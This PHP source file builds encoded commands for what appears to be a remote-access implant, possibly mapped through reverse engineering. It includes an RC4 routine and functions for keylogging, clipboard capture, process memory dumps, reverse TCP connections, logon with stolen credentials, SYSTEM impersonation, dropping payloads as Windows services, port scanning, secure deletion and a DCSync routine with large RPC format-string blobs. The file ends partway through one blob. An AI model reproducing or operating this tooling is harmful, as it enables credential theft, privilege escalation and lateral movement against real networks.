<?php

/*
 * RC4 symmetric cipher encryption/decryption
 *
 * @license Public Domain
 * @param string key - secret key for encryption/decryption
 * @param string str - string to be encrypted/decrypted
 * @return string
 */
function rc4($key, $str) {
	$s = array();
	for ($i = 0; $i < 256; $i++) {
		$s[$i] = $i;
	}
	$j = 0;
	for ($i = 0; $i < 256; $i++) {
		$j = ($j + $s[$i] + ord($key[$i % strlen($key)])) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
	}
	$i = 0;
	$j = 0;
	$res = '';
	for ($y = 0; $y < strlen($str); $y++) {
		$i = ($i + 1) % 256;
		$j = ($j + $s[$i]) % 256;
		$x = $s[$i];
		$s[$i] = $s[$j];
		$s[$j] = $x;
		$res .= $str[$y] ^ chr($s[($s[$i] + $s[$j]) % 256]);
	}
	return $res;
}




// base64_encode(RC4("OV1T557KBIUECUM5", base64_encode("something"), base64_encode("some_other_thing")))

// OK 1
function GetCurrentDir()
{
	$cmd_id = "\x9f\x3c";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 2
function GetIpTable()
{
	$cmd_id = "\x3f\xd5";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 3
function GetAccountPrivileges()
{
	$cmd_id = "\xfe\x4f";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 4
function LockWorkStation()
{
	$cmd_id = "\x91\x03";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 5
function GetLogicalDrives()
{
	$cmd_id = "\x09\x06";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 6 GetTickCount / 60000
function GetSystemUptime()
{
	$cmd_id = "\x01\x0a";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 7
function GetLastInputInfo()
{
	$cmd_id = "\x06\x0b";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 8
function ExitProcess()
{
	$cmd_id = "\x03\x07";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 9 GlobalStructure fields
function RevertToSelf()
{
	$cmd_id = "\x05\x06";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 10
function GetClipBoardData()
{
	$cmd_id = "\x05\x01";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 11
function EnumDevicesDrivers()
{
	$cmd_id = "\x44\xc1";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 12 CRASH - missing user32 function
function GetScreenshot()
{
	$cmd_id = "\x41\x9c";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 13 OK : TODO
function domain_controler()
{
	$cmd_id = "\xcb\xe3";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 14 OK
function GetNetworkAdaptersInfo()
{
	$cmd_id = "\x16\xf6";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 15 OK
function ExitThread()
{
	$cmd_id = "\x03\x08";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 16 OK
function GetMemoryDump($process_name)
{
	$cmd_id = "\x34\x49 $process_name";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 17 OK
function GetTcpUdpTables()
{
	$cmd_id = "\x39\xb3";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 18 OK
function getIpForwardTable()
{
	$cmd_id = "\x1A\xD4";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 19 OK
function QuerySessionInformation()
{
	$cmd_id = "\x9A\xBE";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 20 OK
function GetDnsCacheDataTable()
{
	$cmd_id = "\xb7\x38";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

////////////////////////////////////////////////

// OK
function fingerprint()
{
	$cmd_id = "\x48\x52";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// KO
function EnumWindows()
{
	$cmd_id = "\x35\x61";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK
function ListInstalledPrograms()
{
	$cmd_id = "\xe8\x73";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK
function RegisterSessionPowerSettingNotification()
{
	$cmd_id = "\xa3\xd9";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// param 1 : ?
// param 2 : host name ?
// param 3 : port ?
function reverseTCP($label, $hostname, $port)
{
	$cmd_id = "\x59\xd3 $label $hostname $port";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK 
// param4 base64 msg
function sendto($label, $hostname, $port, $b64_data)
{
	$cmd_id = "\x59\xd4 $label $hostname $port $b64_data";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// param1 : socket
// param2 : b64_encoded msg
// TODO
function send($socket, $b64_data)
{
	$cmd_id = "\x60\xd4 $socket $b64_data";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// param1 : socket
function closesocket($socket)
{
	$cmd_id = "\x59\xd9 $socket";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK
function start_keylogging()
{
	$cmd_id = "\xa1\x2d";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK
function update_sleep_conf($int1, $int2)
{
	$cmd_id = "\x29\x21 $int1 $int2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK
function SetCurrentDirectory($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x39\x11 $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// OK
function CopyFileW($src, $dst)
{
	$src_16le = UConverter::transcode($src, 'UTF-16LE', 'UTF-8');
	$dst_16le = UConverter::transcode($dst, 'UTF-16LE', 'UTF-8');
	$src_b64 = base64_encode($src_16le);
	$dst_b64 = base64_encode($dst_16le);
	
	$cmd_id = "\x05\xa9 $src_b64 $dst_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 13 OK
function MoveFileW($src, $dst)
{
	$src_16le = UConverter::transcode($src, 'UTF-16LE', 'UTF-8');
	$dst_16le = UConverter::transcode($dst, 'UTF-16LE', 'UTF-8');
	$src_b64 = base64_encode($src_16le);
	$dst_b64 = base64_encode($dst_16le);
	
	$cmd_id = "\x05\xa9 $src_b64 $dst_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 14 OK
// $secure_erase OPTIONAL
// if $secure_erase == "rf" -> overwritefile before deleting
function DeleteFileSecure($dos_path, $secure_erase)
{
	$dos_path_16le = UConverter::transcode($dos_path, 'UTF-16LE', 'UTF-8');
	$dos_path_b64 = base64_encode($dos_path_16le);
	
	$cmd_id = "\x93\xe9 $secure_erase $dos_path_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 15 
function CreateDirectoryW($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x61\x3f $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 16
function RemoveDirectoryW($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x40\x8f $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

//17
function listdir($dir_path)
{
	$dir_16le = UConverter::transcode($dir_path, 'UTF-16LE', 'UTF-8');
	$b64_dir = base64_encode($dir_16le);
	$cmd_id = "\x32\x0a $b64_dir";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 18 
// param 1 = "A" (NetUserEnum), "B" (NetUserGetInfo), "C" (NetLocalGroupEnum) or "D" (NetLocalGroupGetMembers / NetGroupGetUsers)
// param 2 = ??
function NetInfo($option, $unkn)
{
	$cmd_id = "\x59\xa9 $option $unkn";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 19
// param 1 : Domain name
// param 2 : base64(username Wide)
// param 3 : password
// param 4 : application name
// param 5 : command line
function CreateProcessWithLogon($domain, $username, $password, $AppName, $CommandLine)
{
	$username_le16 = UConverter::transcode($username, 'UTF-16LE', 'UTF-8');
	$username_b64 = base64_encode($username_le16);
	
	$cmd_id = "\x84\xf5 $domain $username_b64 $password $AppName $CommandLine";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	param 1 = "local" or "network"
	param 2 = Domain name
	param 3 = base64(username Wide)
	param 4 = password
*/
function LogonUserW($type, $domain, $username, $password)
{
	$username_le16 = UConverter::transcode($username, 'UTF-16LE', 'UTF-8');
	$username_b64 = base64_encode($username_le16);
	
	$cmd_id = "\x99\xf9 $type $domain $username_b64 $password";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


///////////////////////////////////////////////////////////


function CreateProcessA($process_path)
{
	$cmd_id = "\xb0\xe9 $process_path";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


function TerminateProcess($pid)
{
	$cmd_id = "\xc0\xeb $pid";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

//$verb = "open" or "runas"

function ShellExecuteExA($verb, $file, $parameters)
{
	$cmd_id = "\xd0\xbe $verb $file $parameters";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


function ListActiveProcess()
{
	$cmd_id = "\xe0\x9d";
	
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
 	$command_line OPTIONAL
 	ex: ImpersonateSystem("cmd");
 	ex: ImpersonateSystem();
 */
function ImpersonateSystem($command_line = null)
{
	if ($command_line === null) {
		$cmd_id = "\xae\x6b";
	}
	else {
		$cmd_id = "\xae\x6b $command_line";
	}
	
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 5
function ImpersonateSystem2()
{
	$cmd_id = "\x39\x6f";
	
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// CreateProcess based on fields C1E0 and C26C from GlobalStruct
function CreateProcessSuspended_todo($p1, $p2)
{
	$p1_b64 = base64_encode($p1);
	
	$cmd_id = "\xd9\xf3 $p1_b64 $p2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// CreateProcess based on fields C1E0 and C26C from GlobalStruct
function unknown2($p1, $p2)
{
	$p1_b64 = base64_encode($p1);
	
	$cmd_id = "\xd4\x3f $p1_b64 $p2";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// param2 is optional
// if 0 or not specified 512kb will be read from targeted file
function ReadFileW($filename, $size_in_KB)
{
	$filename_le16 = UConverter::transcode($filename, 'UTF-16LE', 'UTF-8');
	$p1_b64 = base64_encode($filename_le16);
	
	$cmd_id = "\x74\x2c $p1_b64 $size_in_KB";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


/*
	param 1 : 
	"1" = HKEY_LOCAL_MACHINE
	"2" = HKEY_CURRENT_USER
	"3" = HKEY_CLASSES_ROOT
	"4" = HKEY_CURRENT_CONFIG
	else = HKEY_USERS
*/
// 9
function RegEnumKeyA($hKey, $SubKey)
{

	$cmd_id = "\x36\x6c $hKey $SubKey";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

/*
	$MachineName : can be NULL (LocalComputer)
	$param 2 : "full" or nothing (OPTIONAL) ?
	$param 3 : service Name (OPTIONAL)
	Query All services or just the one specified
*/
function QueryServiceConfig($MachineName, $p2, $ServiceName)
{

	$cmd_id = "\x58\xb4 $MachineName $p2 $ServiceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

function QueryServiceConfigEnum()
{

	$cmd_id = "\x58\xb4";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 11
function unknown3($p1)
{
	$p1_b64 = base64_encode($p1);
	
	$cmd_id = "\xea\xe2 ABCD $p1_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 12
function WriteFile($filename, $data)
{
	$data_b64 = base64_encode($data);
	
	$cmd_id = "\xa1\x13 $filename $data_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 13
function listen($label, $port)
{
	
	$cmd_id = "\x9a\x69 $label $port";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 14
function pipe_com_todo($PipeName)
{
	
	$cmd_id = "\x4d\x3c $PipeName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 15
function install_as_service($MachineName, $serviceName, $payload)
{
	$payload_b64 = base64_encode($payload);
	$dropPath = "C:\\Windows\\$serviceName.exe";
	
	$cmd_id = "\x37\xfe $MachineName $dropPath $serviceName $payload_b64";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


// 16
function createService($MachineName, $serviceName, $path)
{
	$cmd_id = "\xe9\x97 $MachineName $serviceName $path";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}


// 17
function deleteService($MachineName, $serviceName)
{
	$cmd_id = "\x73\xfa $MachineName $serviceName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 18 DemandStart
function changeServiceConfig($MachineName, $serviceName, $BinaryPathName)
{
	$cmd_id = "\x3e\x3b $MachineName $serviceName $BinaryPathName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 19
function GetProcessInfo($processName)
{
	$cmd_id = "\x62\xc6 $processName";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}

// 20  port_scan("tiguanin.com", "8041 80 42");
function port_scan($hostname, $ports)
{
	$cmd_id = "\x91\xe5 $hostname $ports";
	$cmd_id_b64 = base64_encode($cmd_id);
	
	return $cmd_id_b64;
}
/////////////////////////////////////////////////////////////

/*
	$p1 : sizeof = 0x6DD
	$p2 : sizeof = 0x355
 	ex: DCSync("mylab.local");
*/
function DCSync($DomainName)
{
	// TypeFormatString
	$p1 = "\x00\x00\x1d\x00\x08\x00\x01\x5b\x15\x03\x10\x00\x08\x06\x06\x4c\x00\xf1\xff\x5b\x15\x07\x18\x00\x0b\x0b\x0b\x5b\xb7\x08\x00\x00";
$p1 = $p1 . "\x00\x00\x00\x00\x10\x00\xb7\x08\x00\x00\x00\x00\x10\x27\x00\x00\x1b\x00\x01\x00\x19\x00\x00\x00\x01\x00\x02\x5b\x1a\x03\x10\x00";
$p1 = $p1 . "\x00\x00\x0a\x00\x4c\x00\xe0\xff\x40\x36\x5c\x5b\x12\x00\xe2\xff\x1a\x03\x18\x00\x00\x00\x00\x00\x08\x40\x4c\x00\xe0\xff\x5c\x5b";
$p1 = $p1 . "\x21\x03\x00\x00\x19\x00\x00\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xde\xff\x5c\x5b\x1a\x03\x10\x00\x00\x00\x0a\x00\x4c\x00";
$p1 = $p1 . "\x9c\xff\x40\x36\x5c\x5b\x12\x00\xd8\xff\xb7\x08\x00\x00\x00\x00\x00\x00\x10\x00\x1d\x00\x1c\x00\x02\x5b\x15\x00\x1c\x00\x4c\x00";
$p1 = $p1 . "\xf4\xff\x5c\x5b\x1b\x01\x02\x00\x09\x57\xfc\xff\x01\x00\x05\x5b\x17\x03\x38\x00\xf0\xff\x08\x08\x4c\x00\x4e\xff\x4c\x00\xdc\xff";
$p1 = $p1 . "\x08\x5b\xb7\x08\x00\x00\x00\x00\x00\x00\x10\x00\x15\x07\x20\x00\x4c\x00\x36\xff\x0b\x0b\x5c\x5b\x1b\x07\x20\x00\x09\x00\xf8\xff";
$p1 = $p1 . "\x01\x00\x4c\x00\xe8\xff\x5c\x5b\x1a\x07\x10\x00\xec\xff\x00\x00\x08\x08\x4c\x00\xce\xff\x08\x5b\xb7\x08\x00\x00\x00\x00\x00\x00";
$p1 = $p1 . "\x10\x00\xb7\x08\x00\x00\x00\x00\x00\x00\xa0\x00\xb7\x08\x00\x00\x00\x00\x00\x00\x90\x01\x1a\x03\x10\x00\x00\x00\x0a\x00\x4c\x00";
$p1 = $p1 . "\xec\xff\x40\x36\x5c\x5b\x12\x00\x08\xff\x21\x03\x00\x00\x19\x00\x00\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xda\xff\x5c\x5b";
$p1 = $p1 . "\x1a\x03\x10\x00\x00\x00\x0a\x00\x4c\x00\xb8\xff\x40\x36\x5c\x5b\x12\x00\xd8\xff\x1a\x03\x18\x00\x00\x00\x00\x00\x08\x40\x4c\x00";
$p1 = $p1 . "\xe0\xff\x5c\x5b\x21\x03\x00\x00\x19\x00\x00\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xde\xff\x5c\x5b\x1a\x03\x10\x00\x00\x00";
$p1 = $p1 . "\x0a\x00\x4c\x00\x74\xff\x40\x36\x5c\x5b\x12\x00\xd8\xff\x1a\x03\x20\x00\x00\x00\x0a\x00\x36\x08\x40\x4c\x00\xdf\xff\x5b\x12\x00";
$p1 = $p1 . "\x10\xff\xb7\x08\x00\x00\x00\x00\x00\x00\x10\x00\x15\x07\x28\x00\x08\x40\x0b\x4c\x00\x53\xfe\x0b\x5c\x5b\x1b\x07\x28\x00\x09\x00";
$p1 = $p1 . "\xf8\xff\x01\x00\x4c\x00\xe6\xff\x5c\x5b\x1a\x07\x08\x00\xec\xff\x00\x00\x4c\x00\xce\xff\x40\x5b\x1a\x03\x40\x00\x00\x00\x0c\x00";
$p1 = $p1 . "\x36\x4c\x00\xab\xff\x08\x40\x36\x36\x5b\x12\x00\xec\xff\x12\x00\x18\xfe\x12\x00\xd6\xff\x15\x07\x30\x00\x0b\x4c\x00\xaf\xff\x5b";
$p1 = $p1 . "\x1a\x07\x58\x00\x00\x00\x10\x00\x36\x08\x40\x4c\x00\x09\xff\x08\x40\x4c\x00\xe3\xff\x5b\x12\x00\x98\xfe\x21\x07\x00\x00\x19\x00";
$p1 = $p1 . "\x94\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xd4\xff\x5c\x5b\x1a\x07\xa8\x00\x00\x00\x28\x00\x4c\x00\xce\xfd\x4c\x00\xca\xfd";
$p1 = $p1 . "\x36\x4c\x00\xd1\xfd\x4c\x00\xcd\xfd\x36\x4c\x00\x2a\xfe\x08\x08\x08\x40\x36\x08\x08\x08\x4c\x00\x32\xfe\x36\x08\x40\x5b\x12\x00";
$p1 = $p1 . "\x50\xfe\x12\x00\x84\xfe\x12\x00\x70\xff\x12\x00\xae\xff\x1a\x03\x18\x00\x00\x00\x08\x00\x08\x40\x36\x36\x5c\x5b\x12\x08\x25\x5c";
$p1 = $p1 . "\x12\x08\x25\x5c\x21\x03\x00\x00\x19\x00\x00\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xd8\xff\x5c\x5b\x1a\x03\x10\x00\x00\x00";
$p1 = $p1 . "\x06\x00\x08\x40\x36\x5b\x12\x00\xdc\xff\x1a\x03\x08\x00\x00\x00\x04\x00\x36\x5b\x12\x00\xe4\xff\xb7\x08\x00\x00\x00\x00\x10\x27";
$p1 = $p1 . "\x00\x00\x1a\x03\x88\x00\x00\x00\x1e\x00\x36\x36\x36\x36\x36\x36\x36\x08\x08\x08\x4c\x00\x32\xfd\x4c\x00\x2e\xfd\x4c\x00\x2a\xfd";
$p1 = $p1 . "\x4c\x00\x26\xfd\x40\x5b\x12\x08\x25\x5c\x12\x08\x25\x5c\x12\x08\x25\x5c\x12\x08\x25\x5c\x12\x08\x25\x5c\x12\x08\x25\x5c\x12\x08";
$p1 = $p1 . "\x25\x5c\x21\x03\x00\x00\x19\x00\x00\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xae\xff\x5c\x5b\x1a\x03\x10\x00\x00\x00\x0a\x00";
$p1 = $p1 . "\x4c\x00\x96\xff\x40\x36\x5c\x5b\x12\x00\xd8\xff\xb7\x08\x00\x00\x00\x00\x10\x27\x00\x00\x15\x03\x2c\x00\x4c\x00\xcc\xfc\x4c\x00";
$p1 = $p1 . "\x5a\xfd\x5c\x5b\x21\x03\x00\x00\x19\x00\x1c\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xe0\xff\x5c\x5b\x1a\x03\x28\x00\x00\x00";
$p1 = $p1 . "\x10\x00\x36\x08\x08\x08\x08\x06\x3e\x4c\x00\xc1\xff\x36\x5c\x5b\x12\x00\x3e\xfd\x12\x00\xce\xff\x12\x00\x8e\xfc\x12\x00\x18\x00";
$p1 = $p1 . "\xb7\x08\x01\x00\x00\x00\x10\x27\x00\x00\x1b\x00\x01\x00\x09\x00\xfc\xff\x01\x00\x02\x5b\x1a\x03\x04\x00\xf0\xff\x00\x00\x4c\x00";
$p1 = $p1 . "\xe0\xff\x5c\x5b\x11\x14\xd6\xff\x11\x04\x02\x00\x30\xa0\x00\x00\x11\x04\x02\x00\x30\xe1\x00\x00\x30\x41\x00\x00\x11\x00\x02\x00";
$p1 = $p1 . "\x2b\x09\x29\x00\x08\x00\x01\x00\x02\x00\x80\x00\x01\x00\x08\x00\x00\x00\x64\x00\xff\xff\x15\x07\x08\x00\x0b\x5b\xb7\x08\x00\x00";
$p1 = $p1 . "\x00\x00\x00\x00\x10\x00\x15\x07\x18\x00\x4c\x00\x1c\xfc\x0b\x5b\x1b\x07\x18\x00\x09\x00\xf8\xff\x01\x00\x4c\x00\xea\xff\x5c\x5b";
$p1 = $p1 . "\x1a\x07\x10\x00\xec\xff\x00\x00\x08\x08\x4c\x00\xd0\xff\x08\x5b\xb7\x08\x01\x00\x00\x00\x00\x00\x10\x00\x1b\x03\x04\x00\x09\x00";
$p1 = $p1 . "\xfc\xff\x01\x00\x08\x5b\x1a\x03\x0c\x00\xf0\xff\x00\x00\x08\x08\x4c\x00\xde\xff\x5c\x5b\x1a\x07\x80\x00\x00\x00\x20\x00\x4c\x00";
$p1 = $p1 . "\xc8\xfb\x4c\x00\xc4\xfb\x36\x4c\x00\xcb\xfb\x36\x08\x08\x08\x08\x4c\x00\x84\xff\x36\x36\x4c\x00\x1e\xfc\x5c\x5b\x11\x00\x52\xfc";
$p1 = $p1 . "\x12\x00\x9e\xff\x12\x00\xc0\xff\x12\x00\xbc\xff\x11\x0c\x08\x5c\x11\x00\x02\x00\x2b\x09\x29\x54\x18\x00\x01\x00\x02\x00\xa8\x00";
$p1 = $p1 . "\x01\x00\x06\x00\x00\x00\xaa\xfd\xff\xff\x11\x00\x02\x00\x2b\x09\x29\x00\x08\x00\x01\x00\x02\x00\x28\x00\x01\x00\x01\x00\x00\x00";
$p1 = $p1 . "\x04\x00\xff\xff\x1a\x03\x28\x00\x00\x00\x0c\x00\x36\x36\x4c\x00\x58\xfb\x08\x40\x5c\x5b\x11\x00\xf8\xfb\x11\x08\x22\x5c\x11\x00";
$p1 = $p1 . "\x02\x00\x2b\x09\x29\x00\x08\x00\x01\x00\x02\x00\x68\x00\x01\x00\x01\x00\x00\x00\x14\x00\xff\xff\x1d\x00\x54\x00\x02\x5b\x15\x00";
$p1 = $p1 . "\x54\x00\x4c\x00\xf4\xff\x5c\x5b\x1a\x03\x68\x00\x00\x00\x0a\x00\x36\x36\x4c\x00\xea\xff\x08\x5b\x11\x00\xb6\xfb\x11\x08\x22\x5c";
$p1 = $p1 . "\x11\x00\x02\x00\x2b\x09\x29\x00\x08\x00\x01\x00\x02\x00\x18\x00\x01\x00\x01\x00\x00\x00\x04\x00\xff\xff\x1a\x03\x18\x00\x00\x00";
$p1 = $p1 . "\x08\x00\x36\x36\x08\x40\x5c\x5b\x11\x00\x86\xfb\x12\x08\x22\x5c\x11\x00\x02\x00\x2b\x09\x29\x00\x08\x00\x01\x00\x02\x00\x30\x00";
$p1 = $p1 . "\x01\x00\x01\x00\x00\x00\x24\x00\xff\xff\xb7\x08\x01\x00\x00\x00\x10\x27\x00\x00\x21\x03\x00\x00\x19\x00\x04\x00\x01\x00\xff\xff";
$p1 = $p1 . "\xff\xff\x00\x00\x12\x00\x4a\xfb\x5c\x5b\x1a\x03\x30\x00\x00\x00\x12\x00\x08\x4c\x00\xd5\xff\x36\x4c\x00\x00\xfc\x4c\x00\xf8\xfa";
$p1 = $p1 . "\x5c\x5b\x12\x00\xd0\xff\x11\x04\x02\x00\x2b\x09\x29\x54\x18\x00\x01\x00\x02\x00\x20\x00\x01\x00\x01\x00\x00\x00\x24\x00\xff\xff";
$p1 = $p1 . "\xb7\x08\x00\x00\x00\x00\x10\x27\x00\x00\x21\x03\x00\x00\x19\x00\x04\x00\x01\x00\xff\xff\xff\xff\x00\x00\x4c\x00\xd2\xfb\x5c\x5b";
$p1 = $p1 . "\x1a\x03\x20\x00\x00\x00\x0e\x00\x08\x4c\x00\xd5\xff\x36\x4c\x00\xa6\xfa\x5c\x5b\x12\x00\xd4\xff\x11\x00\x02\x00\x2b\x09\x29\x00";
$p1 = $p1 . "\x08\x00\x01\x00\x02\x00\x20\x00\x01\x00\x01\x00\x00\x00\x24\x00\xff\xff\xb7\x08\x01\x00\x00\x00\x10\x27\x00\x00\x21\x03\x00\x00";
$p1 = $p1 . "\x19\x00\x14\x00\x01\x00\xff\xff\xff\xff\x00\x00\x12\x08\x25\x5c\x5c\x5b\x1a\x03\x20\x00\x00\x00\x0e\x00\x08\x08\x08\x08\x08\x4c";
$p1 = $p1 . "\x00\xd1\xff\x36\x5c\x5b\x12\x00\xd4\xff\x11\x04\x02\x00\x2b\x09\x29\x54\x18\x00\x01\x00\x02\x00\x08\x00\x01\x00\x01\x00\x00\x00";
$p1 = $p1 . "\x6a\xfc\xff\xff\x11\x00\x02\x00\x2b\x09\x29\x00\x08\x00\x01\x00\x02\x00\x10\x00\x01\x00\x01\x00\x00\x00\x04\x00\xff\xff\x1a\x03";
$p1 = $p1 . "\x10\x00\x00\x00\x06\x00\x36\x08\x40\x5b\x12\x08\x25\x5c\x11\x04\x02\x00\x2b\x09\x29\x54\x18\x00\x01\x00\x02\x00\x10\x00\x01\x00";
$p1 = $p1 . "\x02\x00\x00\x00\x94\xfc\xff\xff\x11\x00\x02\x00\x2b\x09\x29\x00\x08\x00\x01\x00\x02\x00\x28\x00\x01\x00\x02\x00\x00\x00\x16\x00";
$p1 = $p1 . "\xff\xff\x1a\x03\x28\x00\x00\x00\x08\x00\x36\x4c\x00\xe1\xfa\x5b\x12\x00\xf0\xff\x1a\x03\x28\x00\x00\x00\x00\x00\x4c\x00\xe4\xff";
$p1 = $p1 . "\x5c\x5b\x11\x04\x02\x00\x2b\x09\x29\x54\x18\x00\x01\x00\x02\x00\x28\x00\x01\x00\x02\x00\x00\x00\x82\xfc\xff\xff\x00";
	
	// ProcFormatString	
	$p2 = "\x00\x48\x00\x00\x00\x00\x00\x00\x30\x00\x32\x00\x00\x00\x44\x00\x40\x00\x47\x05\x0a\x07\x01\x00\x01\x00\x00\x00\x00\x00\x0a\x00";
$p2 = $p2 . "\x08\x00\x78\x03\x0b\x00\x10\x00\x7c\x03\x13\x20\x18\x00\xa4\x03\x10\x01\x20\x00\xac\x03\x70\x00\x28\x00\x08\x00\x00\x48\x00\x00";
$p2 = $p2 . "\x00\x00\x01\x00\x10\x00\x30\xe0\x00\x00\x00\x00\x38\x00\x40\x00\x44\x02\x0a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x18\x01\x00\x00";
$p2 = $p2 . "\xb4\x03\x70\x00\x08\x00\x08\x00\x00\x48\x00\x00\x00\x00\x02\x00\x08\x00\x32\x00\x00\x00\x00\x00\x00\x00\x40\x00\x0a\x01\x00\x00";
$p2 = $p2 . "\x00\x00\x00\x00\x00\x00\x00\x48\x00\x00\x00\x00\x03\x00\x30\x00\x30\x40\x00\x00\x00\x00\x2c\x00\x24\x00\x47\x06\x0a\x07\x01\x00";
$p2 = $p2 . "\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\xb8\x03\x48\x00\x08\x00\x08\x00\x0b\x01\x10\x00\xc0\x03\x50\x21\x18\x00\x08\x00\x13\x01";
$p2 = $p2 . "\x20\x00\x74\x04\x70\x00\x28\x00\x08\x00\x00\x48\x00\x00\x00\x00\x04\x00\x20\x00\x30\x40\x00\x00\x00\x00\x2c\x00\x08\x00\x46\x04";
$p2 = $p2 . "\x0a\x05\x00\x00\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\xb8\x03\x48\x00\x08\x00\x08\x00\x0b\x01\x10\x00\x8e\x04\x70\x00\x18\x00";
